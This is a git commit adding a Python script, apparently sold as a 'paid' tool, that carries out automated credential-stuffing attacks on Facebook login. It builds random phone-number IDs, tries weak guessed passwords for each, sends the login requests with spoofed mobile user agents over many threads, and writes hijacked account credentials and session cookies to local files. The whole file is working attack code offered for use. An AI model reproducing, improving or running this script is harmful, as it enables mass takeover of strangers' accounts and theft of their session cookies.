bd6eec0137f42cfaaab523103025230a139635bc
Malikimran2 <140838997+Malikimran2@users.noreply.github.com>
2025-08-30 18:01:02 +0500

    im.py
    get clone
    https://github.com/Malikimran2/im.git
    cd im
    python im.py

---
+++ im.py
@@ -0,0 +1,364 @@
+import marshal, base64, zlib
+import os
+os.system('clear')
+import requests
+from requests.auth import HTTPBasicAuth
+import os,random,uuid,requests,sys,string,time
+from concurrent.futures import ThreadPoolExecutor as tred
+from time import sleep
+import aiohttp
+import asyncio
+
+import os,sys,time,json,random,re,string,platform,base64,platform
+import requests,json,os,sys,random,datetime,time,re,platform,string,uuid,base64
+from concurrent.futures import ThreadPoolExecutor as tred
+from time import sleep as waktu
+from time import time as mek
+from bs4 import BeautifulSoup as sop
+import os,base64,zlib,pip,urllib,random, requests
+import importlib.util
+try:
+	import requests
+	from concurrent.futures import ThreadPoolExecutor as ThreadPool
+	from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+	os.system('pip install mechanize requests futures==2 > /dev/null')
+from bs4 import BeautifulSoup
+try:
+	import os,requests,json,time,re,random,sys,uuid,string,subprocess
+	from string import *
+	import bs4
+	from concurrent.futures import ThreadPoolExecutor as tred
+	from bs4 import BeautifulSoup as sop
+	from bs4 import BeautifulSoup
+except ModuleNotFoundError:
+	print('\n Installing missing modules ...')
+	os.system('pip install requests bs4 futures==2 > /dev/null')
+	os.system('python imran.py')
+
+
+
+
+GREEN ='\x1b[38;5;46m'
+RED = '\x1b[38;5;46m'
+R = '{RED}' 
+G = '{GREEN}' 
+Y = '\033[1;33m' 
+Q = '\033[1;37m'
+T = '\033[1;34m'
+x = '\33[m' 
+P = '\x1b[1;97m' 
+M = '\x1b[1;91m' 
+H = '\x1b[1;92m' 
+K = '\x1b[1;93m' 
+B = '\x1b[1;94m' 
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m' 
+N = '\x1b[0m'	
+A = '\x1b[1;90m' 
+BN = '\x1b[1;107m' 
+BBL = '\x1b[1;106m' 
+BP = '\x1b[1;105m' 
+BB = '\x1b[1;104m' 
+BK = '\x1b[1;103m' 
+BH = '\x1b[1;102m' 
+BM = '\x1b[1;101m' 
+BA = '\x1b[1;100m' 
+my_color = [
+ P, M, H, K, B, U, O, N]
+animasi = ["\x1b[1;91mRANDOM","\x1b[1;92mRANDOM","\x1b[1;93mRANDOM","\x1b[1;94mRANDOM","\x1b[1;95mRANDOM","\x1b[1;96mRANDOM","\x1b[1;97mRANDOM","\x1b[1;91mRANDOM","\x1b[1;92mRANDOM","\x1b[1;93mRANDOM","\x1b[1;94mRANDOM","\x1b[1;95mRANDOM","\x1b[1;96mRANDOM"]
+anmasi = ["\x1b[1;91mMAIL-CLONING","\x1b[1;92mMAIL-CLONING","\x1b[1;93mMAIL-CLONING","\x1b[1;94mMAIL-CLONING","\x1b[1;95mMAIL-CLONING","\x1b[1;96mMAIL-CLONING","\x1b[1;97mMAIL-CLONING","\x1b[1;91mMAIL-CLONING","\x1b[1;92mMAIL-CLONING","\x1b[1;93mMAIL-CLONING","\x1b[1;94mMAIL-CLONING","\x1b[1;95mMAIL-CLONING","\x1b[1;96mMAIL-CLONING"]
+
+	
+
+import random
+ugeni = []
+for agents in range(10000):
+	samsung = random.choice(['SM-A205F','SM-A205FN','SM-A205GN','SM-A205YN','SM-A205G','SM-A205W','SM-A205U','SM-A205S','SM-S205DL','SM-A205U1'])
+	realme = random.choice(['RMX3310','RMX3312','RMX3311'])
+	oppo = random.choice(['GLK-LX1','GLK-LX2','GLK-LX3','GLK-LX1U','GLK-AL00','GLK-TL00'])
+	lg = random.choice(['CPH1913','CPH1911'])
+	sony = random.choice(['vivo 1935', 'V1965A'])
+	vivo = random.choice(['SM-G800H','SM-G800F','SM-G800M','SM-G800Y'])
+	fbcr = random.choice(["Zong","Jazz","Zong 4G","Zong CMPak","Jio 4G","null"])
+	fblc = random.choice(['en_US','en_GB','en_PK','ur_PK'])
+	ft = ['SM-M625F','LM-K525', 'NID-1050','SM-A3051','CPH2069','RMX3286','A101XM','SM-A505GT','WKG-LX9','SM-A4260','Infinix X680C','RMX3265','GLA-LX1','Redmi 4X','V2204','vivo 2018','PCB-T104','2201122G','Infinix X688B','RMP2106','OXF-AN10','Infinix X6835B','CPH2399','SM-F731B','SM-T515','CPH2209','M2101K6R','V2135','SM-M307FN','JLN-LX3','CPH2123','Lenovo TB-X605F','V2110','RMX3572','LM-X420']
+	su = ['QP1A.190711.020','QKQ1.190918.001','TP1A.220624.014','SP1A.210812.016','QTG3.200617.002','SQ3A.220705.0040','RP1A.200720.011']
+	so = random.choice(su)
+	efg = random.choice(ft)
+	ua6 = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/420.0.0.32.61;FBBV/443010639;FBDM/{density=2.0,width=720,height=1424};FBLC/en_GB;FBRV/0;FBCR/T-Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1901;FBSV/8.1;FBOP/1;FBCA/x86:armeabi-v7a;]"
+	ua5 = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/271.0.0.55.109;FBBV/215365644;FBDM/{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/0;FBCR/AT&T;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/x86:armeabi-v7a;]"
+	ua4 = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/41.0.0.0.94;FBBV/13553093;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBRV/0;FBCR/AT&T;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/8.0;FBOP/19;FBCA/x86:armeabi-v7a;]"
+	ua2 = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/459.0.0.48.108;FBBV/321809601;FBDM/{density=1.7,width=720,height=1469};FBLC/en_GB;FBRV/0;FBCR/Version;FBMF/realme;FBBD/realme;FBPN/com.facebook.orca;FBDV/RMX1911;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+	ua7 = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/200.0.0.50.194;FBBV/133691590;FBDM/{density=1.7,width=720,height=1469};FBLC/en_US;FBRV/0;FBCR/Vodafone US;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1911;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+	ua10 = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/MessengerLite;FBAV/103.0.0.8.95;FBBV/117237725;FBDM/{density=2.0,width=720,height=1424};FBLC/en_GB;FBRV/0;FBCR/T-Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.mlite;FBDV/CPH1901;FBSV/8.1;FBOP/1;FBCA/x86:armeabi-v7a;]"
+	ua1 = "Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4, 13))+"; "+efg+" Build/"+so+") [FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/MessengerLite;FBAV/297.0.0.13.113;FBBV/360722580;FBDM/{density=3.0,width=1080,height=2175};FBLC/en_GB;FBCR/Version;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.mlite;FBDV/Redmi Note 4;FBSV/7.1.1;FBOP/1;FBCA/x86:armeabi-v7a;]"
+	ua3 = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/184.0.0.30.93;FBBV/124623621;FBDM/{density=2.0,width=720,height=1424};FBLC/en_US;FBRV/124623621;Vodafone US;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH1901/1;null;FBCA/arm64-v8a:armeabi-v7l;]"
+	ua = str(random.choice([ua6,ua5,ua7,ua2,ua4,ua1,ua3,ua10]))  # Add ua6 to the list of choices
+	ugeni.append(ua) # Append the randomly chosen user agent to the ugen list
+
+
+def clear():
+	os.system('clear')
+	print(logo)
+folder_path = '/sdcard/imran'
+sys.stdout.write('\x1b]2;imran\x07')
+try:
+	os.makedirs(folder_path, exist_ok=True)
+except:
+	pass
+					
+loop = 0
+cps=[]
+pcp=[]
+tokenku=[]
+loop=0
+oks=[]
+ok = []
+cp = []
+user = []
+id=[]
+ck=[]
+princp=[]
+bou = []
+method = []
+password = []
+logo=(f"""\x1b[1;97m
+
+--------------------------------------------------
+'    __     ___      ___   _______        __      _____  ___   
+'   |" \   |"  \    /"  | /"      \      /""\    (\"   \|"  \  
+'   ||  |   \   \  //   ||:        |    /    \   |.\\   \    | 
+'   |:  |   /\\  \/.    ||_____/   )   /' /\  \  |: \.   \\  | 
+'   |.  |  |: \.        | //      /   //  __'  \ |.  \    \. | 
+'   /\  |\ |.  \    /:  ||:  __   \  /   /  \\  \|    \    \ | 
+'  (__\_|_)|___|\__/|___||__|  \___)(___/    \___)\___|\____\) 
+'                                                                
+--------------------------------------------------
+ \033[1;37m[<>] Owner :Malik imran 
+ [<>] Tool :  PAID
+ [<>] Version : 
+ [<>] Tool : RANDOM
+ [<>] Just Wait n Watch Babe <3
+\x1b[1;92m--------------------------------------------------""")
+
+def linex():
+	print(f'\x1b[1;92m------------------------------------------------')
+
+
+def rd6(ids, passlist):
+    global oks, cps, loop
+    try:
+        for pas in passlist:
+            XX = random.choice(my_color)
+            random_color = random.choice(animasi)
+            sys.stdout.write(f'\r{P} [{random_color}-{H}M6{P}] [{XX}{loop}{P}]{U}/{H}OK{P}-{GREEN}{len(oks)}{P}')
+            sys.stdout.flush()
+            rr = random.randint
+            ses = requests.Session()
+            ua = random.choice(ugeni)
+
+            # Get login page to extract lsd and jazoest
+            login_url = "https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjo1LCJjcmVhdGlvbl90aW1lIjoxNzUzOTM5MzA4fQ%3D%3D&next=https%3A%2F%2Fweb.facebook.com%2Fbusiness%3Fwtsid%3Drdr_0yW8eFUTIf9rmj2rx"
+            login_page = ses.get(login_url)
+            lsd = re.search(r'name="lsd" value="(.*?)"', login_page.text).group(1)
+            jazoest = re.search(r'name="jazoest" value="(.*?)"', login_page.text).group(1)
+
+            # Build inner nested params
+            cuoz = ";".join([f"{key}={value}" for key, value in login_page.cookies.get_dict().items()])
+            inner = {
+                "server_params": {
+                    "credential_type": "password",
+                    "username_text_input_id": "y6ly1d:67",
+                    "password_text_input_id": "y6ly1d:68",
+                    "login_source": "Login",
+                    "login_credential_type": "none",
+                    "server_login_source": "login",
+                    "ar_event_source": "login_home_page",
+                    "should_trigger_override_login_success_action": 0,
+                    "should_trigger_override_login_2fa_action": 0,
+                    "is_caa_perf_enabled": 0,
+                    "reg_flow_source": "login_home_native_integration_point",
+                    "caller": "gslr",
+                    "next_uri": "https://m.facebook.com/business?wtsid=rdr_0yW8eFUTIf9rmj2rx",
+                    "is_from_landing_page": 0,
+                    "is_from_empty_password": 0,
+                    "is_from_aymh": 0,
+                    "is_from_password_entry_page": 0,
+                    "is_from_assistive_id": 0,
+                    "is_from_msplit_fallback": 0,
+                    "two_step_login_type": "one_step_login",
+                    "is_vanilla_password_page_empty_password": 0,
+                    "INTERNAL__latency_qpl_marker_id": 36707139,
+                    "INTERNAL__latency_qpl_instance_id": "206695156900436",
+                    "device_id": None,
+                    "family_device_id": None,
+                    "waterfall_id": "40680080-a34c-4918-a762-a0bb674b0355",
+                    "offline_experiment_group": None,
+                    "layered_homepage_experiment_group": None,
+                    "is_platform_login": 0,
+                    "is_from_logged_in_switcher": 0,
+                    "is_from_logged_out": 0,
+                    "access_flow_version": "pre_mt_behavior"
+                },
+                "client_input_params": {
+                    "machine_id": "",
+                    "cloud_trust_token": None,
+                    "block_store_machine_id": "",
+                    "contact_point": ids,
+                    "password": f"#PWD_BROWSER:0:{int(time.time())}:{pas}",
+                    "accounts_list": [],
+                    "fb_ig_device_id": [],
+                    "secure_family_device_id": "",
+                    "encrypted_msisdn": "",
+                    "headers_infra_flow_id": "",
+                    "try_num": 1,
+                    "login_attempt_count": 1,
+                    "event_flow": "login_manual",
+                    "event_step": "home_page",
+                    "openid_tokens": {},
+                    "auth_secure_device_id": "",
+                    "client_known_key_hash": "",
+                    "has_whatsapp_installed": 0,
+                    "sso_token_map_json_string": "",
+                    "should_show_nested_nta_from_aymh": 0,
+                    "password_contains_non_ascii": "false",
+                    "has_granted_read_contacts_permissions": 0,
+                    "has_granted_read_phone_permissions": 0,
+                    "app_manager_id": "",
+                    "aymh_accounts": [{
+                        "id": "",
+                        "profiles": {
+                            "id": {
+                                "user_id": "",
+                                "name": "",
+                                "profile_picture_url": "",
+                                "small_profile_picture_url": None,
+                                "notification_count": 0,
+                                "credential_type": "none",
+                                "token": "",
+                                "last_access_time": 0,
+                                "is_derived": 0,
+                                "username": "",
+                                "password": "",
+                                "has_smartlock": 0,
+                                "account_center_id": "",
+                                "account_source": "",
+                                "credentials": [],
+                                "nta_eligibility_reason": None,
+                                "from_accurate_privacy_result": 0,
+                                "dbln_validated": 0
+                            }
+                        }
+                    }],
+                    "lois_settings": {
+                        "lois_token": ""
+                    }
+                }
+            }
+
+            data = {
+                "__aaid": "0",
+                "__user": "0",
+                "__a": "1",
+                "__req": random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
+                "__hs": "20300.BP:wbloks_caa_pkg.2.0...0",
+                "dpr": "1",
+                "__ccg": "GOOD",
+                "__rev": "1025349684",
+                "__s": "wjzeyw:b43epw:inaq89",
+                "__hsi": "7533112003094568942",
+                "__dyn": "0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde0UE",
+                "fb_dtsg": "NAfsYYLmxQy12D7b1gZH4BtFozDJAD1zEONK59nHaG_55J887iBrVbw:0:0",
+                "jazoest": jazoest,
+                "lsd": lsd,
+                "params": json.dumps({"params": json.dumps(inner)})
+            }
+
+            headers = {
+                "Host": "m.facebook.com",
+                "User-Agent": ua,
+                "Accept": "*/*",
+                "Accept-Encoding": "gzip, deflate, br, zstd",
+                "Connection": "keep-alive",
+                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+                "Origin": "https://m.facebook.com",
+                "X-Requested-With": "mark.via.gp",
+                "Sec-Fetch-Site": "same-origin",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Dest": "empty",
+                "Referer": login_url,
+                "Accept-Language": "en-US,en;q=0.9",
+                "Priority": "u=1, i",
+                "sec-ch-ua": f'"Not.A/Brand";v="{rr(8,20)}", "Chromium";v="{rr(40,114)}", "Google Chrome";v="{rr(40,114)}"',
+                "sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{rr(8,20)}.0.0.0", "Chromium";v="{rr(40,114)}.0.{rr(2000,5999)}.{rr(10,399)}", "Google Chrome";v="{rr(40,114)}.0.{rr(2000,5999)}.{rr(10,399)}"',
+                "sec-ch-ua-platform": '"Android"',
+                "sec-ch-ua-mobile": "?1",
+                "sec-ch-prefers-color-scheme": "light",
+                "sec-ch-ua-model": "",
+                "sec-ch-ua-platform-version": "",
+                "Cookie": cuoz,
+            }
+
+            post_url = "https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=7dc3df7a1c2b41c2ef275eac1130af6da64453b8e5de853b8cf45b43c64d127b"
+            response = ses.post(post_url, data=data, headers=headers, allow_redirects=False)
+
+            cookies = ses.cookies.get_dict()
+            if "checkpoint" in cookies:
+                with open("/sdcard/imran/imran-CP.txt", "a") as f:
+                    f.write(f"{ids}|{pas}\n")
+                cps.append(ids)
+                break
+            elif "c_user" in cookies:
+                kuki = ";".join([f"{k}={v}" for k, v in cookies.items()])
+                idf = cookies.get("c_user", "")
+                print(f"\r\r\033[1;32m [imran-OK] {idf} ✓ {pas}")
+                print(f" \33[1;33m[Cookies🍪] : {kuki}")
+                with open("/sdcard/imran/imran-RANDOM-OK.txt", "a") as f1, \
+                     open("/sdcard/imran/imran-RANDOM-OK-COOKIE.txt", "a") as f2:
+                    f1.write(f"{idf}|{pas}\n")
+                    f2.write(f"{idf}|{pas}|{kuki}\n")
+                oks.append(idf)
+                break
+
+        loop += 1
+
+    except requests.exceptions.ConnectionError:
+        time.sleep(10)
+    except Exception as e:
+        pass
+        
+        
+def pak():
+        user=[]
+        clear()
+        print('\033[m Put Your Own Country code')
+        code = input('\033[1;37m put code: ')
+        try:
+            limit = int(input('\033[m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
+        except ValueError:
+            limit = 5000
+        for nmbr in range(limit):
+            nmp = ''.join(random.choice(string.digits) for _ in range(7))
+            user.append(nmp)
+        with tred(max_workers=30) as HACKER:    
+            linex()
+            clear()
+            tl = str(len(user))
+            print(' \033[1;97mTotal ids : \033[1;32m'+tl+f' ')
+            print(f'\033[1;37m Choice code  :\033[m '+code)
+            linex()
+            for psx in user:
+                ids = code+psx
+                passlist = [psx,ids]
+                HACKER.submit(rd6,ids,passlist)
+        print('\033[1;37m')
+        linex()
+        print(' The process has completed')
+        print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+        linex()
+        input(' Press enter to back ')
+        pak()
+
+if __name__ == "__main__":
+	pak()
